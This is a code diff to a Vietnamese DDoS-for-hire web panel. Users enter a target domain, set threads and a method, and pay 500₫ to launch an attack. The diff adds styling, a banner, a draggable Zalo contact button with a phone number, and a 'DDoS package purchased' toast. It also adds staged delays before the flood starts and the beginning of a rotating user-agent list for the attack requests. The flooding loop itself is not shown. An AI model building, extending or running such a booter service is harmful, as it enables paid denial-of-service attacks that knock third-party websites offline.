@@ -461,6 +461,154 @@
         .profile-info .value.role.admin { background: #fee2e2; color: #dc2626; }
         .profile-info .value.role.vip { background: #dbeafe; color: #2563eb; }
         .profile-info .value.role.user { background: #e2e8f0; color: #475569; }
+        .toast-message {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #ffffff;
+            border-radius: 16px !important;
+            padding: 24px 32px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            z-index: 9999;
+            max-width: 340px;
+            text-align: center;
+            animation: fadeIn 0.3s ease;
+        }
+        .toast-message .icon {
+            font-size: 48px;
+            color: #16a34a;
+            margin-bottom: 12px;
+        }
+        .toast-message .title {
+            font-weight: 700;
+            font-size: 18px;
+            color: #1a2332;
+        }
+        .toast-message .desc {
+            font-size: 14px;
+            color: #64748b;
+            margin: 8px 0 16px;
+        }
+        .toast-message .btn-toast {
+            background: #2563eb;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 8px !important;
+            font-weight: 600;
+            cursor: pointer;
+            transition: .2s;
+        }
+        .toast-message .btn-toast:hover {
+            background: #1d4ed8;
+        }
+        .toast-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.4);
+            z-index: 9998;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
+            to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+        }
+        .status-pending { background: #fef3c7; color: #92400e; }
+        .status-processing { background: #dbeafe; color: #1e40af; }
+        .status-done { background: #d1fae5; color: #065f46; }
+
+        /* ===== NÚT ZALO ===== */
+        .zalo-float {
+            position: fixed;
+            bottom: 100px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50% !important;
+            background: #0068ff;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            box-shadow: 0 4px 20px rgba(0,104,255,0.5);
+            cursor: grab;
+            z-index: 9997;
+            transition: transform 0.2s;
+            border: 3px solid #fff;
+            user-select: none;
+            touch-action: none;
+        }
+        .zalo-float:active {
+            cursor: grabbing;
+        }
+        .zalo-float:hover {
+            transform: scale(1.1);
+        }
+        .zalo-float .tooltip-text {
+            position: absolute;
+            right: 70px;
+            background: #1a2332;
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 8px !important;
+            font-size: 13px;
+            font-weight: 600;
+            white-space: nowrap;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        .zalo-float:hover .tooltip-text {
+            opacity: 1;
+        }
+        .zalo-float .tooltip-text::after {
+            content: '';
+            position: absolute;
+            right: -8px;
+            top: 50%;
+            transform: translateY(-50%);
+            border-left: 8px solid #1a2332;
+            border-top: 8px solid transparent;
+            border-bottom: 8px solid transparent;
+        }
+        @media (max-width: 480px) {
+            .zalo-float {
+                width: 50px;
+                height: 50px;
+                font-size: 26px;
+                bottom: 80px;
+                right: 15px;
+            }
+            .zalo-float .tooltip-text {
+                display: none;
+            }
+        }
+
+        /* ===== ẢNH DDOS FLPHG ===== */
+        .ddos-banner {
+            width: 100%;
+            max-height: 120px;
+            object-fit: contain;
+            margin-bottom: 12px;
+            border-radius: 8px !important;
+        }
+        .ddos-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+        .ddos-title img {
+            height: 40px;
+            width: auto;
+        }
+        .ddos-title h6 {
+            margin: 0;
+        }
     </style>
 </head>
 <body>
@@ -607,7 +755,14 @@
 
         <!-- ===== DDoS ===== -->
         <div v-show="activeMenu === 'ddos'" class="card-content">
-            <h6><i class="bi bi-hurricane text-primary"></i> DDoS Web</h6>
+            <!-- Ảnh DDOS FLPHG bự -->
+            <img src="https://cdn.upanhlaylink.com/i/R4tnXsnU.png" alt="DDOS FLPHG" class="ddos-banner" />
+            
+            <div class="ddos-title">
+                <i class="bi bi-hurricane text-primary" style="font-size:24px;"></i>
+                <h6 style="font-size:20px;font-weight:700;margin:0;">DDoS Web</h6>
+            </div>
+            
             <div class="form-group">
                 <label>Tên miền</label>
                 <input v-model="targetUrl" class="form-control" placeholder="nhập tên miền (vd: ancd.com)" />
@@ -628,7 +783,7 @@
                 </div>
             </div>
             <button class="btn-ddos" @click="startDDoS" :disabled="isRunning || (currentUser.balance < 500 && currentUser.balance !== Infinity && currentUser.balance !== 'vô hạn')">
-                <i class="bi bi-play-circle"></i> {{ isRunning ? 'ĐANG TẤN CÔNG...' : 'TẤN CÔNG (500₫)' }}
+                <i class="bi bi-play-circle"></i> {{ isRunning ? 'ĐANG XỬ LÝ...' : 'TẤN CÔNG (500₫)' }}
             </button>
             <div class="d-flex justify-content-between mt-2">
                 <span class="badge bg-light text-dark p-2">📊 {{ statusText }}</span>
@@ -692,7 +847,7 @@
                     <div class="d-flex justify-content-between align-items-center">
                         <div>
                             <span><i class="bi bi-link-45deg"></i> {{item.target}}</span>
-                            <span class="badge ms-2" :class="{'status-duyet':item.status==='Đang duyệt','status-ddos':item.status==='Đang DDoS','status-thanhcong':item.status==='Thành công'}">
+                            <span class="badge ms-2" :class="item.status === 'Đang duyệt' ? 'status-pending' : item.status === 'Đang DDoS' ? 'status-processing' : 'status-done'">
                                 {{item.status}}
                             </span>
                         </div>
@@ -738,6 +893,21 @@
             </button>
         </div>
     </div>
+
+    <!-- ===== NÚT ZALO ===== -->
+    <div class="zalo-float" @mousedown="startDrag" @touchstart="startDrag" @click="openZalo" id="zaloBtn">
+        <span class="tooltip-text">💬 Chat Zalo</span>
+        <img src="https://cdn.upanhlaylink.com/i/zalo-icon.png" alt="Zalo" style="width:36px;height:36px;border-radius:50%;object-fit:contain;" />
+    </div>
+
+    <!-- ===== TOAST THÔNG BÁO ===== -->
+    <div v-if="showToast" class="toast-overlay" @click="closeToast"></div>
+    <div v-if="showToast" class="toast-message">
+        <div class="icon">✅</div>
+        <div class="title">Mua gói DDoS thành công!</div>
+        <div class="desc">Vui lòng vào <strong>Lịch sử</strong> để xem chi tiết.</div>
+        <button class="btn-toast" @click="goToHistory">Xem lịch sử</button>
+    </div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.min.js"></script>
@@ -771,7 +941,11 @@ new Vue({
         attackLogs: [],
         historyItems: [],
         timerRPS: null,
-        currentAttackCount: 0
+        currentAttackCount: 0,
+        showToast: false,
+        isDragging: false,
+        dragOffsetX: 0,
+        dragOffsetY: 0
     },
     computed: {
         isAdmin() { return this.currentUser && this.currentUser.role === 'admin'; }
@@ -905,6 +1079,57 @@ new Vue({
                 this.napNote = '';
             }
         },
+        showToastMessage() {
+            this.showToast = true;
+        },
+        closeToast() {
+            this.showToast = false;
+        },
+        goToHistory() {
+            this.showToast = false;
+            this.activeMenu = 'lichsu';
+        },
+        openZalo() {
+            if (!this.isDragging) {
+                window.open('https://zalo.me/0705511795', '_blank');
+            }
+        },
+        startDrag(e) {
+            this.isDragging = false;
+            const btn = document.getElementById('zaloBtn');
+            const rect = btn.getBoundingClientRect();
+            const clientX = e.type === 'touchstart' ? e.touches[0].clientX : e.clientX;
+            const clientY = e.type === 'touchstart' ? e.touches[0].clientY : e.clientY;
+            this.dragOffsetX = clientX - rect.left;
+            this.dragOffsetY = clientY - rect.top;
+            
+            const onMove = (ev) => {
+                this.isDragging = true;
+                const cx = ev.type === 'touchmove' ? ev.touches[0].clientX : ev.clientX;
+                const cy = ev.type === 'touchmove' ? ev.touches[0].clientY : ev.clientY;
+                let x = cx - this.dragOffsetX;
+                let y = cy - this.dragOffsetY;
+                x = Math.max(0, Math.min(window.innerWidth - 70, x));
+                y = Math.max(0, Math.min(window.innerHeight - 70, y));
+                btn.style.left = x + 'px';
+                btn.style.top = y + 'px';
+                btn.style.right = 'auto';
+                btn.style.bottom = 'auto';
+            };
+            
+            const onEnd = () => {
+                document.removeEventListener('mousemove', onMove);
+                document.removeEventListener('mouseup', onEnd);
+                document.removeEventListener('touchmove', onMove);
+                document.removeEventListener('touchend', onEnd);
+                setTimeout(() => { this.isDragging = false; }, 100);
+            };
+            
+            document.addEventListener('mousemove', onMove);
+            document.addEventListener('mouseup', onEnd);
+            document.addEventListener('touchmove', onMove);
+            document.addEventListener('touchend', onEnd);
+        },
         async startDDoS() {
             if(this.isRunning) return;
             if(!this.targetUrl.trim()) return alert('Nhập tên miền');
@@ -928,6 +1153,8 @@ new Vue({
                 this.saveUsers();
             }
 
+            this.showToastMessage();
+
             const historyItem = {
                 id: Date.now(),
                 target: this.targetUrl.trim(),
@@ -942,18 +1169,26 @@ new Vue({
             this.showDone = false; 
             this.stopFlag = false; 
             this.isRunning = true;
-            this.statusText = 'ĐANG TẤN CÔNG...'; 
+            this.statusText = 'ĐANG DUYỆT...'; 
             this.totalRequests = 0; 
             this.currentRPS = 0;
             this.currentAttackCount = 0;
 
+            await new Promise(resolve => setTimeout(resolve, 20000));
+
             historyItem.status = 'Đang DDoS';
+            this.statusText = 'ĐANG DDoS...';
             this.saveHistory();
+
+            await new Promise(resolve => setTimeout(resolve, 30000));
 
             const targetUrl = url;
             const maxRequests = this.maxRequests;
             const threads = Math.min(500, Math.max(1, this.threads));
             const method = this.method;
+
+            this.statusText = 'ĐANG TẤN CÔNG...';
+            this.isRunning = true;
 
             const uas = [
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -1033,6 +1268,11 @@ new Vue({
     },
     mounted() { 
         this.initData();
+        const btn = document.getElementById('zaloBtn');
+        if (btn) {
+            btn.style.bottom = '100px';
+            btn.style.right = '20px';
+        }
     }
 });
 </script>
